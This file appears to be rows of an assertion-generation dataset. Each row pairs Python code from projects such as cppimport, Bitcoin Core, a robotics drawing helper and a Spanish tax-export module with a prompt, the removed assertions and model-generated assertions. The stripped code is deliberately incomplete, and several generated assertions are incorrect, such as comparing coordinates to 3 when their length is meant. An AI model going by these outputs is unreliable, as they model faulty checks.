172def test_import_hook():
173    import cppimport.import_hook
174
175    # Force rebuild to make sure we're not just reloading the already compiled
176    # module from disk
177    cppimport.force_rebuild(True)
178    import hook_test
179
180    cppimport.force_rebuild(False)
181
182
183def test_submodule_import_hook():
184    import cppimport.import_hook
185
186    # Force rebuild to make sure we're not just reloading the already compiled
187    # module from disk
188    cppimport.force_rebuild(True)
189    import apackage.mymodule
190
191    cppimport.force_rebuild(False)
192
193
194def test_relative_import():
195    import cppimport.import_hook
196
197    cppimport.force_rebuild(True)
198    from apackage.rel_import_tester import f
199
200    cppimport.force_rebuild(False)
201    print(f())
202
203
204def test_multiple_processes():
205    with tmp_dir([""tests/hook_test.cpp""]) as tmp_path:
206        test_code = f""""""
207import os;
208os.chdir('{tmp_path}');
209import cppimport.import_hook;
210import hook_test;
211        """"""
212        processes = [
213            Process(target=subprocess_check, args=(test_code,)) for i in range(100)
214        ]
215
216        for p in processes:
217            p.start()
218
219        for p in processes:
220            p.join()
221
222",7725,"[[39, 'test_code', '!=', '', 'Check that test_code is not an empty string'],
 [53, 'files', '!=', None, 'Check that files is not None'], 
 [68, 'mymodule_loc', '!=', '', 'Check that mymodule_loc is not an empty string'], 
 [72, 'apackage_correct', '!=', '', 'Check that apackage_correct is not an empty string'], 
 [75, 'inner_correct', '!=', '', 'Check that inner_correct is not an empty string'], 
 [79, 'rendered_path', '!=', '', 'Check that rendered_path is not an empty string'], 
 [87, 'mymodule', '!=', None, 'Check that mymodule is not None'], 
 [94, 'mymodule', '!=', None, 'Check that mymodule is not None'],
 [100, 'mymodule', '!=', None, 'Check that mymodule is not None'], 
 [104, 'mymodule', '!=', None, 'Check that mymodule is not None'], 
 [108, 'mymodule', '!=', None, 'Check that mymodule is not None'], 
 [114, 'orig_sys_path', '!=', '', 'Check that orig_sys_path is not an empty string'], 
 [122, 'mymodule', '!=', None, 'Check that mymodule is not None'], 
 [142, 'mymodule', '!=', None, 'Check that mymodule is not None'], 
 [152, 'mymodule', '!=', None, 'Check that mymodule is not None'],
 [163, 'raw_extension', '!=', '', 'Check that raw_extension is not an empty string'],
 [169, 'mod', '!=', None, 'Check that mod is not None'],
 [205, 'tmp_path', '!=', '', 'Check that tmp_path is not an empty string'],
 [211, 'processes', '!=', [], 'Check that processes is not an empty list']]"
GroestlCoin/bitcoin,"#!/usr/bin/env python3
# Copyright (c) 2014-2021 The Bitcoin Core developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
""""""Test gettxoutproof and verifytxoutproof RPCs.""""""

from test_framework.blocktools import COINBASE_MATURITY
from test_framework.messages import (
    CMerkleBlock,
    from_hex,
)
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import (
    assert_equal,
    assert_raises_rpc_error,
)
from test_framework.wallet import MiniWallet


class MerkleBlockTest(BitcoinTestFramework):
    def set_test_params(self):
        self.num_nodes = 2
        self.setup_clean_chain = True
        self.extra_args = [
            [],
            [""-txindex""],
        ]

    def run_test(self):
        miniwallet = MiniWallet(self.nodes[0])
        # Add enough mature utxos to the wallet, so that all txs spend confirmed coins
        self.generate(miniwallet, 5)
        self.generate(self.nodes[0], COINBASE_MATURITY)

        chain_height = self.nodes[1].getblockcount()
        assert_equal(chain_height, 105)

        txid1 = miniwallet.send_self_transfer(from_node=self.nodes[0])['txid']
        txid2 = miniwallet.send_self_transfer(from_node=self.nodes[0])['txid']
        # This will raise an exception because the transaction is not yet in a block
        assert_raises_rpc_error(-5, ""Transaction not yet in block"", self.nodes[0].gettxoutproof, [txid1])

        self.generate(self.nodes[0], 1)
        blockhash = self.nodes[0].getblockhash(chain_height + 1)

        txlist = []
        blocktxn = self.nodes[0].getblock(blockhash, True)[""tx""]
        txlist.append(blocktxn[1])
        txlist.append(blocktxn[2])

        assert_equal(self.nodes[0].verifytxoutproof(self.nodes[0].gettxoutproof([txid1])), [txid1])
        assert_equal(self.nodes[0].verifytxoutproof(self.nodes[0].gettxoutproof([txid1, txid2])), txlist)
        assert_equal(self.nodes[0].verifytxoutproof(self.nodes[0].gettxoutproof([txid1, txid2], blockhash)), txlist)

        txin_spent = miniwallet.get_utxo(txid=txid2)  # Get the change from txid2
        tx3 = miniwallet.send_self_transfer(from_node=self.nodes[0], utxo_to_spend=txin_spent)
        txid3 = tx3['txid']
        self.generate(self.nodes[0], 1)

        txid_spent = txin_spent[""txid""]
        txid_unspent = txid1  # Input was change from txid2, so txid1 should be unspent

        # Invalid txids
        assert_raises_rpc_error(-8, ""txid must be of length 64 (not 32, for '00000000000000000000000000000000')"", self.nodes[0].gettxoutproof, [""00000000000000000000000000000000""], blockhash)
        assert_raises_rpc_error(-8, ""txid must be hexadecimal string (not 'ZZZ0000000000000000000000000000000000000000000000000000000000000')"", self.nodes[0].gettxoutproof, [""ZZZ0000000000000000000000000000000000000000000000000000000000000""], blockhash)
        # Invalid blockhashes
        assert_raises_rpc_error(-8, ""blockhash must be of length 64 (not 32, for '00000000000000000000000000000000')"", self.nodes[0].gettxoutproof, [txid_spent], ""00000000000000000000000000000000"")
        assert_raises_rpc_error(-8, ""blockhash must be hexadecimal string (not 'ZZZ0000000000000000000000000000000000000000000000000000000000000')"", self.nodes[0].gettxoutproof, [txid_spent], ""ZZZ0000000000000000000000000000000000000000000000000000000000000"")
        # We can't find the block from a fully-spent tx
        assert_raises_rpc_error(-5, ""Transaction not yet in block"", self.nodes[0].gettxoutproof, [txid_spent])
        # We can get the proof if we specify the block
        assert_equal(self.nodes[0].verifytxoutproof(self.nodes[0].gettxoutproof([txid_spent], blockhash)), [txid_spent])
        # We can't get the proof if we specify a non-existent block
        assert_raises_rpc_error(-5, ""Block not found"", self.nodes[0].gettxoutproof, [txid_spent], ""0000000000000000000000000000000000000000000000000000000000000000"")
        # We can get the proof if the transaction is unspent
        assert_equal(self.nodes[0].verifytxoutproof(self.nodes[0].gettxoutproof([txid_unspent])), [txid_unspent])
        # We can get the proof if we provide a list of transactions and one of them is unspent. The ordering of the list should not matter.
        assert_equal(sorted(self.nodes[0].verifytxoutproof(self.nodes[0].gettxoutproof([txid1, txid2]))), sorted(txlist))
        assert_equal(sorted(self.nodes[0].verifytxoutproof(self.nodes[0].gettxoutproof([txid2, txid1]))), sorted(txlist))
        # We can always get a proof if we have a -txindex
        assert_equal(self.nodes[0].verifytxoutproof(self.nodes[1].gettxoutproof([txid_spent])), [txid_spent])
        # We can't get a proof if we specify transactions from different blocks
        assert_raises_rpc_error(-5, ""Not all transactions found in specified or retrieved block"", self.nodes[0].gettxoutproof, [txid1, txid3])
        # Test empty list
        assert_raises_rpc_error(-8, ""Parameter 'txids' cannot be empty"", self.nodes[0].gettxoutproof, [])
        # Test duplicate txid
        assert_raises_rpc_error(-8, 'Invalid parameter, duplicated txid', self.nodes[0].gettxoutproof, [txid1, txid1])

        # Now we'll try tweaking a proof.
        proof = self.nodes[1].gettxoutproof([txid1, txid2])
        assert txid1 in self.nodes[0].verifytxoutproof(proof)
        assert txid2 in self.nodes[1].verifytxoutproof(proof)

        tweaked_proof = from_hex(CMerkleBlock(), proof)

        # Make sure that our serialization/deserialization is working
        assert txid1 in self.nodes[0].verifytxoutproof(tweaked_proof.serialize().hex())

        # Check to see if we can go up the merkle tree and pass this off as a
        # single-transaction block
        tweaked_proof.txn.nTransactions = 1
        tweaked_proof.txn.vHash = [tweaked_proof.header.hashMerkleRoot]
        tweaked_proof.txn.vBits = [True] + [False]*7

        for n in self.nodes:
            assert not n.verifytxoutproof(tweaked_proof.serialize().hex())

        # TODO: try more variants, eg transactions at different depths, and
        # verify that the proofs are invalid

if __name__ == '__main__':
    MerkleBlockTest().main()
","
1#!/usr/bin/env python3
2# Copyright (c) 2014-2021 The Bitcoin Core developers
3# Distributed under the MIT software license, see the accompanying
4# file COPYING or http://www.opensource.org/licenses/mit-license.php.
5""""""Test gettxoutproof and verifytxoutproof RPCs.""""""
6
7from test_framework.blocktools import COINBASE_MATURITY
8from test_framework.messages import (
9    CMerkleBlock,
10    from_hex,
11)
12from test_framework.test_framework import BitcoinTestFramework
13from test_framework.util import (
14)
15from test_framework.wallet import MiniWallet
16
17
18class MerkleBlockTest(BitcoinTestFramework):
19    def set_test_params(self):
20        self.num_nodes = 2
21        self.setup_clean_chain = True
22        self.extra_args = [
23            [],
24            [""-txindex""],
25        ]
26
27    def run_test(self):
28        miniwallet = MiniWallet(self.nodes[0])
29        # Add enough mature utxos to the wallet, so that all txs spend confirmed coins
30        self.generate(miniwallet, 5)
31        self.generate(self.nodes[0], COINBASE_MATURITY)
32
33        chain_height = self.nodes[1].getblockcount()
34
35        txid1 = miniwallet.send_self_transfer(from_node=self.nodes[0])['txid']
36        txid2 = miniwallet.send_self_transfer(from_node=self.nodes[0])['txid']
37        # This will raise an exception because the transaction is not yet in a block
38
39        self.generate(self.nodes[0], 1)
40        blockhash = self.nodes[0].getblockhash(chain_height + 1)
41
42        txlist = []
43        blocktxn = self.nodes[0].getblock(blockhash, True)[""tx""]
44        txlist.append(blocktxn[1])
45        txlist.append(blocktxn[2])
46
47
48        txin_spent = miniwallet.get_utxo(txid=txid2)  # Get the change from txid2
49        tx3 = miniwallet.send_self_transfer(from_node=self.nodes[0], utxo_to_spend=txin_spent)
50        txid3 = tx3['txid']
51        self.generate(self.nodes[0], 1)
52
53        txid_spent = txin_spent[""txid""]
54        txid_unspent = txid1  # Input was change from txid2, so txid1 should be unspent
55
56        # Invalid txids
57        # Invalid blockhashes
58        # We can't find the block from a fully-spent tx
59        # We can get the proof if we specify the block
60        # We can't get the proof if we specify a non-existent block
61        # We can get the proof if the transaction is unspent
62        # We can get the proof if we provide a list of transactions and one of them is unspent. The ordering of the list should not matter.
63        # We can always get a proof if we have a -txindex
64        # We can't get a proof if we specify transactions from different blocks
65        # Test empty list
66        # Test duplicate txid
67
68        # Now we'll try tweaking a proof.
69        proof = self.nodes[1].gettxoutproof([txid1, txid2])
70
71        tweaked_proof = from_hex(CMerkleBlock(), proof)
72
73        # Make sure that our serialization/deserialization is working
74
75        # Check to see if we can go up the merkle tree and pass this off as a
76        # single-transaction block
77        tweaked_proof.txn.nTransactions = 1
78        tweaked_proof.txn.vHash = [tweaked_proof.header.hashMerkleRoot]
79        tweaked_proof.txn.vBits = [True] + [False]*7
80
81        for n in self.nodes:
82
83        # TODO: try more variants, eg transactions at different depths, and
84        # verify that the proofs are invalid
85
86if __name__ == '__main__':
87    MerkleBlockTest().main()
88","[['n.verifytxoutproof(tweaked_proof.serialize().hex())', '==', 'False']]",25,1,0.04,0.000160179400929,"['self.num_nodes', 'self.setup_clean_chain', 'self.extra_args', 'miniwallet', 'chain_height', 'txid1', 'txid2', 'blockhash', 'txlist', 'blocktxn', 'txin_spent', 'tx3', 'txid3', 'txid_spent', 'txid_unspent', 'proof', 'tweaked_proof', 'tweaked_proof.txn.nTransactions', 'tweaked_proof.txn.vHash', 'tweaked_proof.txn.vBits']",20,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.num_nodes', 'self.setup_clean_chain', 'self.extra_args', 'miniwallet', 'chain_height', 'txid1', 'txid2', 'blockhash', 'txlist', 'blocktxn', 'txin_spent', 'tx3', 'txid3', 'txid_spent', 'txid_unspent', 'proof', 'tweaked_proof', 'tweaked_proof.txn.nTransactions', 'tweaked_proof.txn.vHash', 'tweaked_proof.txn.vBits']
*Code:

1#!/usr/bin/env python3
2# Copyright (c) 2014-2021 The Bitcoin Core developers
3# Distributed under the MIT software license, see the accompanying
4# file COPYING or http://www.opensource.org/licenses/mit-license.php.
5""""""Test gettxoutproof and verifytxoutproof RPCs.""""""
6
7from test_framework.blocktools import COINBASE_MATURITY
8from test_framework.messages import (
9    CMerkleBlock,
10    from_hex,
11)
12from test_framework.test_framework import BitcoinTestFramework
13from test_framework.util import (
14)
15from test_framework.wallet import MiniWallet
16
17
18class MerkleBlockTest(BitcoinTestFramework):
19    def set_test_params(self):
20        self.num_nodes = 2
21        self.setup_clean_chain = True
22        self.extra_args = [
23            [],
24            [""-txindex""],
25        ]
26
27    def run_test(self):
28        miniwallet = MiniWallet(self.nodes[0])
29        # Add enough mature utxos to the wallet, so that all txs spend confirmed coins
30        self.generate(miniwallet, 5)
31        self.generate(self.nodes[0], COINBASE_MATURITY)
32
33        chain_height = self.nodes[1].getblockcount()
34
35        txid1 = miniwallet.send_self_transfer(from_node=self.nodes[0])['txid']
36        txid2 = miniwallet.send_self_transfer(from_node=self.nodes[0])['txid']
37        # This will raise an exception because the transaction is not yet in a block
38
39        self.generate(self.nodes[0], 1)
40        blockhash = self.nodes[0].getblockhash(chain_height + 1)
41
42        txlist = []
43        blocktxn = self.nodes[0].getblock(blockhash, True)[""tx""]
44        txlist.append(blocktxn[1])
45        txlist.append(blocktxn[2])
46
47
48        txin_spent = miniwallet.get_utxo(txid=txid2)  # Get the change from txid2
49        tx3 = miniwallet.send_self_transfer(from_node=self.nodes[0], utxo_to_spend=txin_spent)
50        txid3 = tx3['txid']
51        self.generate(self.nodes[0], 1)
52
53        txid_spent = txin_spent[""txid""]
54        txid_unspent = txid1  # Input was change from txid2, so txid1 should be unspent
55
56        # Invalid txids
57        # Invalid blockhashes
58        # We can't find the block from a fully-spent tx
59        # We can get the proof if we specify the block
60        # We can't get the proof if we specify a non-existent block
61        # We can get the proof if the transaction is unspent
62        # We can get the proof if we provide a list of transactions and one of them is unspent. The ordering of the list should not matter.
63        # We can always get a proof if we have a -txindex
64        # We can't get a proof if we specify transactions from different blocks
65        # Test empty list
66        # Test duplicate txid
67
68        # Now we'll try tweaking a proof.
69        proof = self.nodes[1].gettxoutproof([txid1, txid2])
70
71        tweaked_proof = from_hex(CMerkleBlock(), proof)
72
73        # Make sure that our serialization/deserialization is working
74
75        # Check to see if we can go up the merkle tree and pass this off as a
76        # single-transaction block
77        tweaked_proof.txn.nTransactions = 1
78        tweaked_proof.txn.vHash = [tweaked_proof.header.hashMerkleRoot]
79        tweaked_proof.txn.vBits = [True] + [False]*7
80
81        for n in self.nodes:
82
83        # TODO: try more variants, eg transactions at different depths, and
84        # verify that the proofs are invalid
85
86if __name__ == '__main__':
87    MerkleBlockTest().main()
88",5171,"[[19, 'self.num_nodes', '==', 2, 'we should have exactly 2 nodes for the test'],
[27, 'miniwallet', '!=', None, 'miniwallet should be properly initialized'],
[33, 'chain_height', '>=', 0, 'chain height should be a non-negative integer'],
[35, 'txid1', '!=', None, 'txid1 should be properly initialized'],
[36, 'txid2', '!=', None, 'txid2 should be properly initialized'],
[39, 'self.num_nodes', '>=', 1, 'we should have at least one node to perform the generate operation'],
[42, 'txlist', '==', [], 'txlist should be empty at beginning'],
[44, 'blocktxn', '!=', None, 'blocktxn should be properly initialized'],
[48, 'txin_spent', '!=', None, 'txin_spent should be properly initialized'],
[50, 'tx3', '!=', None, 'tx3 should be properly initialized'],
[51, 'self.num_nodes', '>=', 1, 'we should have at least one node to perform the generate operation'],
[53, 'txid_spent', '!=', None, 'txid_spent should be properly initialized'],
[54, 'txid_unspent', '!=', None, 'txid_unspent should be properly initialized'],
[69, 'proof', '!=', None, 'proof should be properly initialized'],
[71, 'tweaked_proof', '!=', None, 'tweaked_proof should be properly initialized'],
[77, 'tweaked_proof.txn.nTransactions', '==', 1, 'tweaked_proof.txn.nTransactions should be 1 after the tweak operation'],
[79, 'tweaked_proof.txn.vBits', '==', [True] + [False]*7, 'tweaked_proof.txn.vBits should contain one True and seven False after the tweak operation']]"
openhumanoids/oh-distro,"import bot_lcmgl as lcmgl
import numpy as np

def draw_swing(gl, pos0, pos1, swing_height, is_stepping=False, lift_height=None):
    if is_stepping:
        assert lift_height is not None, ""Must provide lift_height for step behavior""
        x,y,z = step_swing_pts(pos0, pos1, swing_height, lift_height)
    else:
        x,y,z = walk_swing_pts(pos0, pos1, swing_height)
    gl.glColor3f(0, .5, .9)
    gl.glLineWidth(4)
    gl.glBegin(lcmgl.GL_LINES)
    for j in range(len(x)-1):
        gl.glVertex3f(x[j], y[j], z[j])
        gl.glVertex3f(x[j+1], y[j+1], z[j+1])
    gl.glEnd()

def step_swing_pts(pos0, pos1, swing_height, lift_height):
    midpoint = np.mean([pos0, pos1], axis=0)
    x = np.array([pos0[0], pos0[0], midpoint[0], pos1[0], pos1[0]])
    y = np.array([pos0[1], pos0[1], midpoint[1], pos1[1], pos1[1]])
    lift_start = max(pos0[2], pos1[2])
    z = np.array([pos0[2], lift_start + lift_height, lift_start + lift_height + swing_height, lift_start + lift_height, pos1[2]])
    return x,y,z

def walk_swing_pts(pos0, pos1, swing_height):
    midpoint = np.mean([pos0, pos1], axis=0)
    x = np.array([pos0[0], midpoint[0], pos1[0]])
    y = np.array([pos0[1], midpoint[1], pos1[1]])
    z = np.array([pos0[2], midpoint[2] + swing_height, pos1[2]])
    return x,y,z


","
1import bot_lcmgl as lcmgl
2import numpy as np
3
4def draw_swing(gl, pos0, pos1, swing_height, is_stepping=False, lift_height=None):
5    if is_stepping:
6        x,y,z = step_swing_pts(pos0, pos1, swing_height, lift_height)
7    else:
8        x,y,z = walk_swing_pts(pos0, pos1, swing_height)
9    gl.glColor3f(0, .5, .9)
10    gl.glLineWidth(4)
11    gl.glBegin(lcmgl.GL_LINES)
12    for j in range(len(x)-1):
13        gl.glVertex3f(x[j], y[j], z[j])
14        gl.glVertex3f(x[j+1], y[j+1], z[j+1])
15    gl.glEnd()
16
17def step_swing_pts(pos0, pos1, swing_height, lift_height):
18    midpoint = np.mean([pos0, pos1], axis=0)
19    x = np.array([pos0[0], pos0[0], midpoint[0], pos1[0], pos1[0]])
20    y = np.array([pos0[1], pos0[1], midpoint[1], pos1[1], pos1[1]])
21    lift_start = max(pos0[2], pos1[2])
22    z = np.array([pos0[2], lift_start + lift_height, lift_start + lift_height + swing_height, lift_start + lift_height, pos1[2]])
23    return x,y,z
24
25def walk_swing_pts(pos0, pos1, swing_height):
26    midpoint = np.mean([pos0, pos1], axis=0)
27    x = np.array([pos0[0], midpoint[0], pos1[0]])
28    y = np.array([pos0[1], midpoint[1], pos1[1]])
29    z = np.array([pos0[2], midpoint[2] + swing_height, pos1[2]])
30    return x,y,z
31
32
33","[['lift_height', '==', 'not None']]",1,1,1.0,0.0007776049766718,"['gl', 'pos0', 'pos1', 'swing_height', 'is_stepping', 'lift_height', 'x', 'y', 'z', 'midpoint', 'lift_start']",11,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['gl', 'pos0', 'pos1', 'swing_height', 'is_stepping', 'lift_height', 'x', 'y', 'z', 'midpoint', 'lift_start']
*Code:

1import bot_lcmgl as lcmgl
2import numpy as np
3
4def draw_swing(gl, pos0, pos1, swing_height, is_stepping=False, lift_height=None):
5    if is_stepping:
6        x,y,z = step_swing_pts(pos0, pos1, swing_height, lift_height)
7    else:
8        x,y,z = walk_swing_pts(pos0, pos1, swing_height)
9    gl.glColor3f(0, .5, .9)
10    gl.glLineWidth(4)
11    gl.glBegin(lcmgl.GL_LINES)
12    for j in range(len(x)-1):
13        gl.glVertex3f(x[j], y[j], z[j])
14        gl.glVertex3f(x[j+1], y[j+1], z[j+1])
15    gl.glEnd()
16
17def step_swing_pts(pos0, pos1, swing_height, lift_height):
18    midpoint = np.mean([pos0, pos1], axis=0)
19    x = np.array([pos0[0], pos0[0], midpoint[0], pos1[0], pos1[0]])
20    y = np.array([pos0[1], pos0[1], midpoint[1], pos1[1], pos1[1]])
21    lift_start = max(pos0[2], pos1[2])
22    z = np.array([pos0[2], lift_start + lift_height, lift_start + lift_height + swing_height, lift_start + lift_height, pos1[2]])
23    return x,y,z
24
25def walk_swing_pts(pos0, pos1, swing_height):
26    midpoint = np.mean([pos0, pos1], axis=0)
27    x = np.array([pos0[0], midpoint[0], pos1[0]])
28    y = np.array([pos0[1], midpoint[1], pos1[1]])
29    z = np.array([pos0[2], midpoint[2] + swing_height, pos1[2]])
30    return x,y,z
31
32
33",2748,"[
[4, 'pos0', '==', 3, ""pos0 should be a 3D coordinate""], 
[4, 'pos1', '==', 3, ""pos1 should be a 3D coordinate""], 
[4, 'swing_height', '>=', 0, ""swing_height should be a non-negative number""], 
[4, 'lift_height', '>=', 0, ""lift_height should be a non-negative number""], 
[4, 'is_stepping', '!=', None, ""is_stepping needs a boolean value""], 
[17, 'midpoint', '==', 3, ""midpoint should be 3D""], 
[19, 'x', '>=', 5, ""x array should have at least 5 points for a step swing""], 
[20, 'y', '>=', 5, ""y array should have at least 5 points for a step swing""], 
[22, 'z', '>=', 5, ""z array should have at least 5 points for a step swing""], 
[25, 'midpoint', '==', 3, ""midpoint should be 3D""], 
[27, 'x', '>=', 3, ""x array should have at least 3 points for a walk swing""], 
[28, 'y', '>=', 3, ""y array should have at least 3 points for a walk swing""], 
[29, 'z', '>=', 3, ""z array should have at least 3 points for a walk swing""]
]"
Endika/l10n-spain,"# -*- coding: utf-8 -*-
##############################################################################
#
#    Copyright (c) 2013 Acysos S.L. (http://acysos.com) All Rights Reserved.
#                       Ignacio Ibeas <ignacio@acysos.com>
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as published
#    by the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from openerp.osv import orm
from openerp.tools.translate import _


class L10nEsAeatMod340ExportToBoe(orm.TransientModel):

    _inherit = ""l10n.es.aeat.mod340.export_to_boe""

    def _get_formated_presenter_record(self, report):
        """"""
        Returns a type 0, declaration/presenter, formated record.
        Only for Comunidad Foral de Navarra

        Format of the record:
            Tipo registro 0 – Registro de presentador:
            Posiciones 	Descripción
            1           Tipo de Registro
            2-4 	Modelo Declaración
            5-8 	Ejercicio
            9-17 	NIF del presentador
            18-57 	Apellidos y nombre o razón social del presentador
            58-59       Domicilio - Siglas de la vía pública
            60-79       Domicilio - Nombre de la vía pública
            80-84       Domicilio - Número de la casa o punto kilométrico
            85-86       Domicilio - Escalera
            87-88       Domicilio - Piso
            89-90       Domicilio - Puerta
            91-95       Domicilio - Código postal
            96-107      Domicilio - Municipio del presentador
            108-109     Domicilio - Código provincia
            110-114     Total de declarantes
            115-123     Total de declarados
            124         Tipo de soporte
            125-133     Télefono de contacto
            134-173     Apellidos y nombre de la persona de contacto
            174-487     Relleno a blanco
            488-500     Sello electrónico
        """"""

        text = ''
        # Tipo de Registro
        text += '0'
        # Modelo Declaración
        text += '340'
        # Ejercicio
        text += self._formatString(report.fiscalyear_id.code, 4)
        # NIF del presentador
        text += self._formatString(report.presenter_vat or '', 9)
        # Apellidos y nombre del presentador
        text += self._formatString(report.presenter_name or '', 40)
        # Siglas de la vía pública
        text += self._formatString(report.presenter_address_acronym or '', 2)
        # Nombre de la vía pública
        text += self._formatString(report.presenter_address_name or '', 20)
        # Número de la casa
        text += self._formatNumber(report.presenter_address_number or 0, 5)
        # Escalera
        text += self._formatString(report.presenter_address_stair or '', 2)
        # Piso
        text += self._formatString(report.presenter_address_floor or '', 2)
        # Puerta
        text += self._formatString(report.presenter_address_door or '', 2)
        # Código postal
        text += self._formatNumber(int(report.presenter_city_id.name or 0), 5)
        # Municipio
        text += self._formatString(report.presenter_city_id.city or '', 12)
        # Código postal
        if report.presenter_city_id:
            text += self._formatNumber(
                int(report.presenter_city_id.state_id.code), 2)
        else:
            text += 2 * ' '
        # Numero total de declarantes, actualmente solo 1
        text += '00001'
        # Número total de registros
        text += self._formatNumber(report.number_records, 9)
        # Tipo de soporte
        text += self._formatString(report.support_type, 1)
        # Persona de contacto (Teléfono)
        text += self._formatString(report.presenter_phone_contact or '', 9)
        # Persona de contacto (Apellidos y nombre)
        text += self._formatString(report.presenter_name_contact or '', 40)
        # Blancos
        text += 314 * ' '
        # Firma digital opcional, no implementado
        text += 13 * ' '
        text += '\r\n'

        assert len(text) == 502, (
            _(""The type 0 record must be 500 characters long""))
        return text

    def _get_formatted_other_records(self, cr, uid, report, context=None):
        file_contents = ''
        file_contents += self._get_formated_presenter_record(report)

        for invoice_issued in report.issued:
            file_contents += self._get_formatted_invoice_issued(
                cr, uid, report, invoice_issued)

        for invoice_received in report.received:
            file_contents += self._get_formatted_invoice_received(
                cr, uid, report, invoice_received)

        return file_contents
","
1# -*- coding: utf-8 -*-
2##############################################################################
3#
4#    Copyright (c) 2013 Acysos S.L. (http://acysos.com) All Rights Reserved.
5#                       Ignacio Ibeas <ignacio@acysos.com>
6#
7#    This program is free software: you can redistribute it and/or modify
8#    it under the terms of the GNU Affero General Public License as published
9#    by the Free Software Foundation, either version 3 of the License, or
10#    (at your option) any later version.
11#
12#    This program is distributed in the hope that it will be useful,
13#    but WITHOUT ANY WARRANTY; without even the implied warranty of
14#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
15#    GNU Affero General Public License for more details.
16#
17#    You should have received a copy of the GNU Affero General Public License
18#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
19#
20##############################################################################
21
22from openerp.osv import orm
23from openerp.tools.translate import _
24
25
26class L10nEsAeatMod340ExportToBoe(orm.TransientModel):
27
28    _inherit = ""l10n.es.aeat.mod340.export_to_boe""
29
30    def _get_formated_presenter_record(self, report):
31        """"""
32        Returns a type 0, declaration/presenter, formated record.
33        Only for Comunidad Foral de Navarra
34
35        Format of the record:
36            Tipo registro 0 – Registro de presentador:
37            Posiciones 	Descripción
38            1           Tipo de Registro
39            2-4 	Modelo Declaración
40            5-8 	Ejercicio
41            9-17 	NIF del presentador
42            18-57 	Apellidos y nombre o razón social del presentador
43            58-59       Domicilio - Siglas de la vía pública
44            60-79       Domicilio - Nombre de la vía pública
45            80-84       Domicilio - Número de la casa o punto kilométrico
46            85-86       Domicilio - Escalera
47            87-88       Domicilio - Piso
48            89-90       Domicilio - Puerta
49            91-95       Domicilio - Código postal
50            96-107      Domicilio - Municipio del presentador
51            108-109     Domicilio - Código provincia
52            110-114     Total de declarantes
53            115-123     Total de declarados
54            124         Tipo de soporte
55            125-133     Télefono de contacto
56            134-173     Apellidos y nombre de la persona de contacto
57            174-487     Relleno a blanco
58            488-500     Sello electrónico
59        """"""
60
61        text = ''
62        # Tipo de Registro
63        text += '0'
64        # Modelo Declaración
65        text += '340'
66        # Ejercicio
67        text += self._formatString(report.fiscalyear_id.code, 4)
68        # NIF del presentador
69        text += self._formatString(report.presenter_vat or '', 9)
70        # Apellidos y nombre del presentador
71        text += self._formatString(report.presenter_name or '', 40)
72        # Siglas de la vía pública
73        text += self._formatString(report.presenter_address_acronym or '', 2)
74        # Nombre de la vía pública
75        text += self._formatString(report.presenter_address_name or '', 20)
76        # Número de la casa
77        text += self._formatNumber(report.presenter_address_number or 0, 5)
78        # Escalera
79        text += self._formatString(report.presenter_address_stair or '', 2)
80        # Piso
81        text += self._formatString(report.presenter_address_floor or '', 2)
82        # Puerta
83        text += self._formatString(report.presenter_address_door or '', 2)
84        # Código postal
85        text += self._formatNumber(int(report.presenter_city_id.name or 0), 5)
86        # Municipio
87        text += self._formatString(report.presenter_city_id.city or '', 12)
88        # Código postal
89        if report.presenter_city_id:
90            text += self._formatNumber(
91                int(report.presenter_city_id.state_id.code), 2)
92        else:
93            text += 2 * ' '
94        # Numero total de declarantes, actualmente solo 1
95        text += '00001'
96        # Número total de registros
97        text += self._formatNumber(report.number_records, 9)
98        # Tipo de soporte
99        text += self._formatString(report.support_type, 1)
100        # Persona de contacto (Teléfono)
101        text += self._formatString(report.presenter_phone_contact or '', 9)
102        # Persona de contacto (Apellidos y nombre)
103        text += self._formatString(report.presenter_name_contact or '', 40)
104        # Blancos
105        text += 314 * ' '
